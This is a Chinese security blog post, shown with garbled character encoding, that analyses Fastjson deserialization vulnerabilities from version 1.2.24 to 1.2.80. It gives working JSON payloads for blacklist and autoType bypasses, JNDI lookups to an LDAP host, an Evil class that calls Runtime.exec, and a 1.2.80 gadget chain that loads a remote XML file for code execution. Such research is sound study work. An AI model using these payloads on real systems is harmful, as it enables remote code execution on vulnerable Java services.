<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Fastjson1.2.24-1.2.80 ååºåˆ—åŒ– | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="åšä¸ªæ€»ç»“ï¼Œå¿˜äº†æ¡å¾—å¿« 1.2.24~1.2.47 1.2.24-1.2.47ï¼ˆç»•è¿‡é»‘åå•çš„poc éƒ½éœ€å¼€å¯autoTypeSupport ç”¨äºè¿”å›classï¼Œå…³é—­throw">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–" />
<meta property="og:description" content="åšä¸ªæ€»ç»“ï¼Œå¿˜äº†æ¡å¾—å¿« 1.2.24~1.2.47 1.2.24-1.2.47ï¼ˆç»•è¿‡é»‘åå•çš„poc éƒ½éœ€å¼€å¯autoTypeSupport ç”¨äºè¿”å›classï¼Œå…³é—­throw" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-06-01T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-06-01T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–"/>
<meta name="twitter:description" content="åšä¸ªæ€»ç»“ï¼Œå¿˜äº†æ¡å¾—å¿« 1.2.24~1.2.47 1.2.24-1.2.47ï¼ˆç»•è¿‡é»‘åå•çš„poc éƒ½éœ€å¼€å¯autoTypeSupport ç”¨äºè¿”å›classï¼Œå…³é—­throw"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–",
      "item": "https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–",
  "name": "Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–",
  "description": "åšä¸ªæ€»ç»“ï¼Œå¿˜äº†æ¡å¾—å¿« 1.2.24~1.2.47 1.2.24-1.2.47ï¼ˆç»•è¿‡é»‘åå•çš„poc éƒ½éœ€å¼€å¯autoTypeSupport ç”¨äºè¿”å›classï¼Œå…³é—­throw",
  "keywords": [
    
  ],
  "articleBody": " åšä¸ªæ€»ç»“ï¼Œå¿˜äº†æ¡å¾—å¿«\n1.2.24~1.2.47 1.2.24-1.2.47ï¼ˆç»•è¿‡é»‘åå•çš„poc éƒ½éœ€å¼€å¯autoTypeSupport ç”¨äºè¿”å›classï¼Œå…³é—­throw\n1.2.24 ä¸¤ä¸ªå¸¸ç”¨pocï¼Œæ— è¿‡æ»¤\nTemplatesImpl ååºåˆ—åŒ–\nJdbcRowSetImpl ååºåˆ—åŒ–\n1.2.25~1.2.41 å¢åŠ äº†é»‘/ç™½åå•æ£€æµ‹ï¼Œä½†æ˜¯å†æœ€åloadClass()æ—¶ï¼Œä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„classè¿›è¡ŒLå’Œ;çš„æˆªå–å†åŠ è½½class ï¼ˆLxxx;-\u003exxxï¼‰\nå¯¼è‡´å¯ä»¥é€šè¿‡L;ç»•è¿‡å‰é¢çš„é»‘åå•æ£€æµ‹ï¼Œæœ€ååŠ è½½æ—¶å†æˆªå–åŠå¯ä»¥åŠ è½½æˆ‘ä»¬æƒ³è¦çš„classï¼Œä»è€Œç»•è¿‡é»‘åå•\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); //å¼€å¯autoTypeSupport {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 1.2.42 åœ¨checkAutoTypeæœ€å¼€å§‹æ—¶åŠä¼šå¯¹classè¿›è¡Œä¸€æ¬¡L;çš„æˆªå–ï¼Œç„¶åè¿›è¡Œé»‘åå•æ£€æµ‹å†loadClass()ï¼Œä½†æ˜¯è¿™ä¸ªæˆªå–åªä¼šè¿›è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥åŒå†™L;è¿›è¡Œç»•è¿‡ï¼ŒLLxxx;;\n// poc ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //å¼€å¯autoTypeSupport {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 1.2.43 åœ¨æ­¤ç‰ˆæœ¬ä¸­,checkAutoTypeå¯¹LLè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœç±»ä»¥LLå¼€å¤´ï¼Œåˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸\nä½†æ˜¯åœ¨loadClass()ä¸­é™¤äº†L;çš„æˆªå–ï¼Œä¼šæœ‰å¯¹[å¼€å¤´çš„æˆªå–ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨[è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯ç›´æ¥ç”¨ä¼šå­˜åœ¨æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™å¡«ä¸Šå¯¹åº”å­—ç¬¦{å³å¯\n// poc ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //å¼€å¯autoTypeSupport {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 1.2.44\nä¿®å¤äº†[çš„ç»•è¿‡ï¼Œåœ¨checkAutoTypeä¸­è¿›è¡Œåˆ¤æ–­å¦‚æœç±»åä»¥[å¼€å§‹åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ \u003c1.2.47(é€šæ€!!!) æ— éœ€å¼€å¯autoTypeSupport\nç®€è¿°ï¼šé€šè¿‡Class.classå¯¹åº”çš„deserializerååºåˆ—åŒ–ï¼Œå®ç°æ¶æ„classçš„åŠ è½½å’Œmapå­˜å‚¨ï¼Œç„¶åå†é€šè¿‡@typeè§¦å‘ï¼Œä»mapä¸­è·å–å­˜å‚¨çš„classå®Œæˆæ¶æ„classçš„è·å–ï¼Œè¿™ä¸ªè¿‡ç¨‹å®Œå…¨é¿å…äº†autoTypeçš„é»‘ç™½åå•æ£€æµ‹\n{ \"1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"2\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:1389/g0tvin\", \"autoCommit\": true } } åˆå§‹åŒ–æ—¶ä¼šç»™deserializerså­˜å…¥ä¸€äº›ç±»å‹\næ‰€ä¸‹é¢è¿™é‡Œä¼šæ‰¾åˆ°Class.class\nç„¶åreturn classï¼Œå†å¯¹å¯¹åº”çš„deserializerè¿›è¡Œååºåˆ—åŒ–\nè€Œdeserialze()ä¸­ä¼šå¯¹valè®¾ç½®çš„å€¼è¿›è¡ŒloadClass()\nå¹¶ä¸”åŠ è½½æˆåŠŸä¼šå°†å…¶putåˆ°mappingsä¸­ï¼ˆcacheé»˜è®¤å°±æ˜¯trueï¼‰,æ²¡é”™è¿™é‡Œmappingså°±æ˜¯getClassFromMapping()ä¸­è·å–çš„mapï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å†@typeè°ƒç”¨jdbcå³å¯ï¼ˆè¿™é‡Œå› ä¸ºæ˜¯æ²¡å¼€å¯autoTypeSupportï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªforé»‘ç™½åå•æ£€æµ‹ï¼Œè€Œé€šè¿‡getClassFromMapping()è·å–åˆ°classåï¼Œæœ‰ifåˆ¤æ–­è¿›è¡Œreturn classï¼Œä¸å†è¿›è¡Œåç»­ä»£ç ï¼ŒåŠå®ç°äº†æ²¡æœ‰é»‘åå•æ£€æµ‹ï¼‰\npublic static Class\u003c?\u003e getClassFromMapping(String className) { return (Class)mappings.get(className); } 1.2.48~1.2.68 1.2.48\nåœ¨MiscCodecä¸­ä¿®æ”¹äº†cacheçš„é»˜è®¤å€¼ï¼Œä¿®æ”¹ä¸ºfalseï¼Œå¹¶ä¸”å¯¹TypeUtils.loadClassä¸­çš„mapping.putåšäº†é™åˆ¶ åœ¨æ­¤ç‰ˆæœ¬ä¸­æ–°å¢äº†ä¸€ä¸ªsafeModeåŠŸèƒ½ï¼Œå¦‚æœå¼€å¯çš„è¯ï¼Œå°†ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå®Œå…¨æœç»äº†autoTypeSupportçš„ç»•è¿‡\nè¿™é‡Œè¿˜å­˜åœ¨ä¸€äº›é»‘åå•ç»•è¿‡ï¼ˆéœ€è¦å¼€å¯autoTypeSupport\nhttps://www.anquanke.com/post/id/232774#h3-18\n1.2.67åˆ†æä¸€æ¡é“¾å­ https://www.anquanke.com/post/id/232774#h3-16\norg.apache.shiro.jndi.JndiObjectFactory ç»•è¿‡é»‘åå• éœ€è¦å¼€å¯AutoTypeSupportï¼ˆä¸ç„¶æ²¡åœ°æ–¹åŠ è½½classï¼‰\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); String a67=\"{\\\"@type\\\":\\\"org.apache.shiro.jndi.JndiObjectFactory\\\",\\\"resourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"instance\\\":{\\\"$ref\\\":\\\"$.instance\\\"}}\"; JSON.parse(a67); è¿™é‡Œé€šè¿‡setResourceNameè®¾ç½®jndiæ¶æ„vpsï¼Œç„¶ågetInstanceè§¦å‘jndiè¯·æ±‚\n\"instance\":{}è¿™é‡Œä¸èƒ½è¿™æ ·ä½¿ç”¨ï¼Œå› ä¸ºpublic T getInstance() {è¿”å›å€¼ç±»å‹ä¸ç»§æ‰¿è‡ªCollection.class Map AtomicBoolean AtomicInteger AtomicLong è¿™é‡ŒTè°ƒè¯•ç±»å‹æ˜¯java.lang.Object\nä½†æ˜¯å¯ä»¥é€š$refæ¥è§¦å‘ï¼Œé‚£ä¹ˆçœ‹çœ‹$refæ˜¯æ€ä¹ˆå¤„ç†çš„\nå¾ªç¯å¼•ç”¨ $ref https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8\nè¯­æ³• æè¿° {\"$ref\":\"$\"} å¼•ç”¨æ ¹å¯¹è±¡ {\"$ref\":\"@\"} å¼•ç”¨è‡ªå·± {\"$ref\":\"..\"} å¼•ç”¨çˆ¶å¯¹è±¡ {\"$ref\":\"../..\"} å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡ {\"$ref\":\"$.members[0].reportTo\"} åŸºäºè·¯å¾„çš„å¼•ç”¨ $refåœ¨ååºåˆ—åŒ–jsonæ—¶ï¼Œä¼šè¿›è¡Œä¸€äº›åˆå§‹åŒ–è®¾ç½®å€¼ï¼Œä¾¿äºåç»­è°ƒç”¨\nvalueæ˜¯ååºåˆ—åŒ–å®Œçš„å¯¹è±¡ï¼Œç„¶åhandleResovleTaskè¿›è¡Œrefçš„è°ƒç”¨\nè°ƒç”¨å‰ï¼Œè¿˜ä¼šåˆå§‹åŒ–ä¸€äº›fieldInfoï¼Œä½¿ä¸€äº›æœ¬æ¥ä¸èƒ½è°ƒç”¨æ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯é€šè¿‡computeGettersåˆå§‹getteræ–¹æ³•çš„ã€‚ä½†æ˜¯è¿™é‡Œå°±ä¸é™åˆ¶è¿”å›å€¼äº†ï¼Œæ‰€ä»¥getInstanceå¾—ä»¥è¢«æ·»åŠ \nè¿™é‡Œæ»¡è¶³é•¿åº¦\u003e=4,ç¬¬å››ä½æ•°ä¸ºå¤§å†™åŸºæœ¬ä¸Šå°±å¯ä»¥æ·»åŠ åˆ°filedInfoé‡Œé¢äº†\n\"instance\":{\"$ref\":\"$.instance\"} ç„¶åå†é€šè¿‡$refå»è·å–{}(æ•´ä¸ªå¯¹è±¡)ä¸‹\"instance\"ï¼Œä»è€Œè§¦å‘è·å–å¯¹è±¡çš„instanceå±æ€§ï¼ŒåŠè°ƒç”¨fieldInfoä¸­å¯¹åº”çš„getteræ–¹æ³•ï¼Œè·å–instanceå€¼ï¼Œè§¦å‘getInstanceå¾—ä»¥åˆ©ç”¨\n\u003c1.2.68(expectClass åœ¨ä¸å¼€å¯autoTypeSupportçš„æƒ…å†µä¸‹ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹å¯ä»¥åˆ©ç”¨expectClassï¼ŒåŠ è½½æ¶æ„classåæ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶å°±èƒ½è¿”å›class\nä¼ å…¥expectClassä¸ä¸ºnull æ¶æ„classç»§æ‰¿expectClass æ­£å¸¸å³ä½¿ç»•è¿‡é»‘åå•ä¹Ÿéœ€è¦å¼€å¯autoTypeSupportï¼Œä¿è¯classçš„è¿”å›\nå…·ä½“åˆ©ç”¨æŸ¥æ‰¾ è€Œæ­£å¸¸è°ƒç”¨ï¼Œæˆ‘ä»¬çš„expectClasséƒ½æ˜¯nullï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾checkAutoTypeå…¶ä»–åœ°æ–¹çš„è°ƒç”¨\nclazz = config.checkAutoType(typeName, null, lexer.getFeatures()); å‘ç°æœ‰2å¤„ï¼Œä¸”éƒ½æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œåˆ†åˆ«æ˜¯JavaBeanDeserializerï¼ŒThrowableDeserializer\nåŠæˆ‘ä»¬éœ€è¦å–çœ‹æ€ä¹ˆè·å–è¿™ä¸¤ä¸ªserializerï¼Œé‚£å°±æ˜¯å»åˆ†ægetDeserializer()å‘—ï¼Œæˆ‘ä»¬çš„expectClassä¸å±äºä¸Šé¢ç±»æ—¶ä¼šè¿›å…¥åˆ°createJavaBeanDeserializer()ï¼ŒåŒæ—¶çœ‹åˆ°ä¸Šæ–¹else ifï¼ŒexpectClassç»§æ‰¿ä¸Throwable.classå³å¯è¿”å›ThrowableDeserializerååºåˆ—åŒ–å™¨\nelse if (Throwable.class.isAssignableFrom(clazz)) { derializer = new ThrowableDeserializer(this, clazz); å¯ä»¥çœ‹åˆ°ç»è¿‡createJavaBeanDeserializer()ä¸€ç³»åˆ—å¤„ç†åï¼Œå¯ä»¥è¿”å›JavaBeanDeserializerååºåˆ—åŒ–å™¨ï¼Œåç»­åˆ™ä¼šè°ƒç”¨\nç„¶åè¿™é‡ŒjsonæŒ‡é’ˆç»§ç»­å‘åè¯»å–ï¼Œkeyä¸º@typeæ—¶è¿›å…¥ifï¼Œå¹¶è¯»å–å€¼ä½œä¸ºtypeNameä¼ å…¥config.checkAutoType(typeName, expectClass, lexer.getFeatures())ï¼›\nåˆ°è¿™é‡Œå°±å®Œæˆäº†expectClassçš„ä¼ å…¥äº†ï¼Œç„¶åæƒ³è¦å®Œæˆreturnåªéœ€è¦ï¼Œç»§æ‰¿äºexpectClassï¼Œä¸”ä¸æ˜¯é»‘åå•å³å¯\nexpectClassæŸ¥æ‰¾ ä¸Šé¢åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªexpectClassæ¥åŠ è½½æˆ‘ä»¬æ¶æ„classäº†ï¼Œä½†æ˜¯è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ªexpectClassæ¥return è‡ªå·±çš„classï¼Œå¹¶è¿›å…¥åˆ°createJavaBeanDeserializer()\næ— autoTypeSupport é¦–å…ˆæ— autoTypeSupport å®Œæˆ return classï¼ŒåŠåˆ†æcheckAutoType()é€»è¾‘\nå¯ä»¥çœ‹åˆ°æ— autoTypeSupportå’ŒexpectClassï¼Œä¼šå…ˆåœ¨mappingså’ŒdeserializersæŸ¥æ‰¾ç„¶åè¿”å›class\nclazz = TypeUtils.getClassFromMapping(typeName); clazz = deserializers.findClass(typeName); ç»§ç»­å¾€ä¸‹åˆ°ç¬¬äºŒæ¬¡é»‘/ç™½åå•æ£€æµ‹ï¼Œä½¿å¾—autoTypeSupportä¸ºfalseä¹Ÿä¼šè¿›è¡Œwafæ£€æµ‹ï¼Œä½†æ˜¯å¯ä»¥å‘ç°æ˜¯ç™½åå•çš„è¯åˆ™ä¼šç›´æ¥loadclasså¹¶è¿”å›class\nç„¶åç»§ç»­å¾€ä¸‹å°±è¿˜æœ‰æœ€åä¸€å¤„ï¼Œç»§æ‰¿äºJSONType.classä¹Ÿä¼šreturn class\nif (clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } è¡¥å……ï¼Œé«˜ç‰ˆæœ¬æ‰æœ‰internalWhiteï¼Œæœ‰ä¸ªç™½åå•ï¼Œå±äºç™½åå•çš„ä¼šåŠ è½½ï¼Œç„¶ååé¢ä»£ç ä¼šreturn class\nif (internalWhite) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); } return å°ç»“ æ€»ç»“ä¸‹æ— autoTypeSupportå¯ä»¥return classçš„ç‚¹\nMappingsï¼Œdeserializers\nTypeUtils.getClassFromMapping(typeName); clazz = deserializers.findClass(typeName); checkAutoTypeé‡Œç™½åå•ï¼ˆé»˜è®¤ä¸ºç©º\nç»§æ‰¿JSONType.class\ninternalWhite ç™½åå•\næ€ä¹ˆæ‰¾ ç„¶åè¦æ‰¾JavaBeanDeserializerçš„è¯ï¼Œdeserializerså°±å¯ä»¥æ’é™¤äº†ï¼Œå› ä¸ºä»–initæ²¡æœ‰putå¯¹åº”çš„JavaBeanDeserializerï¼ˆThrowableDeserializeræœ‰\nmappingsåœ¨addBaseClassMappings()è¿›è¡Œåˆå§‹åŒ–ï¼Œå¯ä»¥æ›´ç›´è§‚çœ‹åˆ°å“ªäº›classå¯ä»¥åˆ©ç”¨\nç„¶åçœ‹åˆ°Object.classè¿™ä¸æ˜¯éšä¾¿åˆ©ç”¨ï¼Ÿï¼ˆ1.2.42å‰é¢çœ‹çš„ä»£ç é€»è¾‘ï¼‰\nç„¶åçœ‹äº†ä¸‹1.2.67åšäº†ä¸€äº›é™åˆ¶ï¼ŒexpectClassä¸èƒ½æ˜¯ä¸‹æ–¹è¿™äº›ç±»ï¼Œä¸ç„¶expectClassFlag = false;-\u003eä¸èƒ½åŠ è½½å’Œè¿”å›classï¼ˆè¿™æ ·å¤„ç†ä¹Ÿæ˜¯ä¸ºäº†é™åˆ¶åˆ©ç”¨èŒƒå›´ï¼Œå› ä¸ºä¸‹æ–¹ç»§æ‰¿ç±»å¾ˆå¤š\nObject.class Serializable.class Cloneable.class Closeable.class EventListener.class Iterable.class Collection.class ç„¶å1.2.67ä»£ç ä¸Šç›¸å¯¹äºä¹‹å‰ç‰ˆæœ¬ï¼Œå¹¶ä¸ä¼šéƒ½è¿›è¡ŒloadClass()äº†ï¼Œæ”¹ä¸ºä¸‹æ–¹è¿™ç§æ–¹å¼\nif (autoTypeSupport || jsonType || expectClassFlag) { //jsonType å°±æ˜¯ç»§æ‰¿JSONType.class boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); } ä¹Ÿå°±æ˜¯ä»mappingså’ŒJSONType.classä»¥åŠinternalWhite é‡Œæ‰¾ expectClass\nEvilç»§æ‰¿AutoCloseableå°±è¡Œ\nString obj=\"{\\\"@type\\\":\\\"java.lang.AutoCloseable\\\"{\\\"@type\\\":\\\"Evil\\\",\\\"cmd\\\":\\\"calc\\\"}}\"; JSON.parseObject(obj); jdbc gadgets\n1.2.68å°ç»“ æ¶æ„ç±»ä¸åœ¨é»‘åå•å†… æ¶æ„ç±»çš„çˆ¶ç±»ï¼ˆexceptClassä¾‹å¦‚AutoCloseableï¼‰ä¸åœ¨é»‘åå•å†… ä¸” è¦èƒ½æœ¬èº«èƒ½return class å¹¶èƒ½è·å–JavaBeanDeserializerorThrowableDeserializerååºåˆ—åŒ–åŠ è½½å™¨ æ¶æ„ç±»ä¸èƒ½æ˜¯æŠ½è±¡ç±» æ¶æ„ç±»ä¸­çš„getter/setter/static block/constructorèƒ½è§¦å‘æ¶æ„æ“ä½œ ä¿®å¤ 1.2.69æ–°å¢äº†é»‘åå•å¯ä»¥å‚è€ƒhttps://github.com/LeadroyaL/fastjson-blacklist\nAutoCloseableå°±è¢«æ·»åŠ åˆ°é»‘åå•äº†ï¼Œæ‰€ä»¥åç»­å»æŸ¥æ‰¾ThrowableæœŸæœ›ç±»çš„åˆ©ç”¨\n1.2.73~1.2.80 1.2.73çš„æ”¹åŠ¨ï¼Œå…è®¸å¯¹ä»»æ„ç±»å‹çš„fieldè¿›è¡Œå®ä¾‹åŒ–ï¼Œå¢åŠ äº†æ”»å‡»é¢ã€‚ä¸‹é¢çš„åˆ©ç”¨å³æ˜¯é€šè¿‡è¿™ä¸ªç‰¹æ€§\nä¸‹å›¾æ˜¯1.2.67çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ²¡æœ‰fieldè¿›è¡Œå®ä¾‹åŒ–ï¼Œè€Œæ˜¯ç›´æ¥è·å–jsonååºåˆ—åŒ–çš„ç»“æœ\nåˆ©ç”¨åŸç† åˆ©ç”¨æ€è·¯å°±åœ¨ä¸‹å›¾ï¼Œé€šè¿‡**putDeserializer**å°†è¿™3ç‚¹åœ°æ–¹å­˜å…¥deserializersç¼“å­˜ä¸­ï¼Œå†æ¬¡@typeè°ƒç”¨ï¼Œå³å¯ç›´æ¥è·å¾—classï¼Œè€Œä¸ä¼šthrowäº†\nå‚ç…§y4æ‰©å±•çš„ä¸€ä¸ªdemo\npublic class MyException extends Throwable { private MyClass clazz; public Evil evil; public void setClazz(MyClass clazz) { this.clazz = clazz; } public MyException(try1 trytry) { trytry.tryname=\"trytry\"; } public MyException() { } } public class MyClass { public String name; } public class try1 { public String tryname; } public class Evil implements AutoCloseable { private String cmd; public void setCmd(String cmd) throws Exception{ this.cmd = cmd; Runtime.getRuntime().exec(this.cmd); } } poc\ndè¿™ä¸ªåœ°æ–¹æ˜¯ç”¨äºæ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹è·å–ï¼Œç¬¬ä¸€æ¬¡å¯ä»¥å»æ‰ï¼ˆå› ä¸ºæ— å‚å’Œæœ‰å‚æ„é€ æ–¹æ³•ï¼Œé»˜è®¤ä¼šé€‰æ‹©æ— å‚\n{ \"a\": { \"@type\": \"java.lang.Exception\", \"@type\": \"MyException\", \"trytry\": {}, \"clazz\": {}, \"evil\": {} }, \"b\": { \"@type\": \"MyClass\", \"name\": \"asd\" }, \"c\": { \"@type\": \"Evil\", \"cmd\": \"calc\" }, \"d\": { \"@type\": \"try1\", \"tryname\": \"tttttry\" } } æµç¨‹çš„è¯ï¼Œç›´æ¥åˆ°Exceptionè·å¾—ThrowableDeserializerå¹¶æ‰§è¡Œdeserialze()è¿™é‡Œå§\nç„¶åè¿™é‡Œä¼šå»ä¸€ä¸ªforå¾ªç¯å¤„ç†jsonä¸­keyçš„å€¼åšå¯¹åº”å¤„ç†ï¼Œ\n@typeåˆ™å»åŠ è½½å¯¹åº”ç±»ï¼Œè¿™é‡Œå°±æ˜¯MyException ç„¶åæ˜¯Stringè¿›è¡Œä¸‹æ–¹åˆ¤æ–­ï¼Œä¸æ˜¯elseifä¸­å­—ç¬¦ï¼Œåˆ™å­˜å‚¨åˆ°otherValuesä¸­ï¼Œï¼ˆclazzï¼Œevilï¼‰ ç„¶åotherValuesä¸ä¸ºç©ºï¼Œåˆ™ä¼šgetDeserializer()è·å–ä¸Šé¢çš„åŠ è½½çš„classï¼Œè€ŒTypeUtils.castè¿™é‡Œå°±å®ä¾‹åŒ–filedï¼Œé‡Œé¢æ‰§è¡Œäº†putDeserializerï¼ˆä¹Ÿå°±æ˜¯åˆ©ç”¨æ€è·¯çš„å…³é”®ï¼‰\nè¿™é‡Œè¿˜éœ€è¦å…³æ³¨ä¸‹exBeanDeser.getFieldDeserializer(key);è¿™é‡Œï¼ŒMyExceptionåªæœ‰ æœ‰å‚è‡ªæ„æ–¹æ³•æ—¶ï¼Œè¿™é‡Œåªä¼šè·å–æœ‰å‚è‡ªæ„æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œå¦å¤–ä¸¤ç§åˆ™ä¸ä¼šè·å–ï¼ˆå¦å¤–ä¸¤ç§åœ¨æ— å‚è‡ªæ„æ—¶ä¼šè·å–ï¼‰(ä¸‹å›¾éœ€è¦å°†MyExceptionæ— å‚è‡ªæ„æ–¹æ³•æ³¨é‡Š\nè·Ÿè¿›é‡Œé¢æœ€ååœ¨castToJavaBean()ä¸­è°ƒç”¨config.getDeserializer()-\u003eputDeserializer()ï¼Œè¿”å›çš„ååºåˆ—åŒ–åŠ è½½å™¨è¿˜ä¼šè°ƒç”¨createInstance()è¿›è¡Œååºåˆ—åŒ–ï¼Œè§¦å‘staticå’Œè‡ªæ„æ–¹æ³•code\nputDeserializer()\nåªæœ‰ æœ‰å‚æ„é€ æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šè¿˜åŸå‚¨å­˜å¯¹åº”æ–¹æ³•çš„å‚æ•°ç±»å‹\næ— æ„é€ æ–¹æ³• or å­˜åœ¨æ— å‚è‡ªæ„æ–¹æ³•æ—¶ï¼Œä¼šè¿˜åŸå¦å¤–ä¸¤ç§æƒ…å†µç±»å‹\nwhy public filed è¿™é‡Œè¦ä¸€ç›´è¿½éšåˆ°fieldsçš„åˆå§‹åŒ–ï¼Œè¿™é‡Œåªä¼šè·å–public æ·»åŠ åˆ°listä¸­\ngadget jdbc ä¾èµ–\ncom.alibaba fastjson 1.2.80 org.python jython 2.7.0 org.postgresql postgresql 42.3.1 org.springframework spring-context 5.3.28 å‚è€ƒçš„y4\n{ \"a\":{ \"@type\":\"java.lang.Exception\", \"@type\":\"org.python.antlr.ParseException\", \"type\":{} }, \"b\":{ \"@type\":\"org.python.core.PyObject\", \"@type\":\"com.ziclix.python.sql.PyConnection\", \"connection\":{ \"@type\":\"org.postgresql.jdbc.PgConnection\", \"hostSpecs\":[ { \"host\":\"127.0.0.1\", \"port\":2333 } ], \"user\":\"user\", \"database\":\"test\", \"info\":{ \"socketFactory\":\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"socketFactoryArg\":\"http://127.0.0.1:8090/exp.xml\" }, \"url\":\"\" } } } è¿™ä¸ªåˆ©ç”¨å¾ˆçŒ›å•Š\næµç¨‹ï¼š\nput Exception\nåŠ è½½ParseExceptionï¼ˆexpectClassï¼šException\nè§¦å‘ParseException#setType â€“\u003e put PyObject\nåŠ è½½PyConnectionï¼ˆexpectClass PyObject\nè§¦å‘PyConnectionè‡ªæ„æ–¹æ³• â€“\u003e put Connection //è¿™é‡Œè¿˜æ²¡åˆ°è°ƒç”¨è‡ªæ„æ–¹æ³•é‚£ä¸ï¼Œè¿™é‡Œè¦å…ˆå¯¹å€¼è¿›è¡Œè¿˜åŸå³\"connection\":{â€¦}ï¼Œè€Œè¿™é‡Œä¼šå…ˆå¤„ç†connectionï¼Œæ‰€ä»¥åŠ è½½PgConnectionæ—¶ï¼ŒConnection ä¸ºexpectClass\nåŠ è½½PgConnectionï¼ˆexpectClass Connection //PGConnectionæ˜¯å¦ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨Connection\nè§¦å‘PgConnectionè‡ªè´­æ–¹æ³• â€“\u003e jdbc rce\né‚£èƒ½ä¸èƒ½è¿™æ ·æ„é€ å‘¢ï¼Œè¿™æ ·è²Œä¼¼æ›´å¥½ç†è§£ï¼Œç†è®ºä¸Šæ˜¯å¯ä»¥çš„ï¼Œåªæ˜¯connectionè¿™ä¸ªå‚æ•°è¿™ä¸ªå€¼ä¸ºä¸‹é¢è¿™ä¸ªçš„è¯ï¼ŒPyConnectionè‡ªè´­çš„æ—¶å€™ä¼šå¼‚å¸¸\n{ â€œaâ€:{â€¦ }, 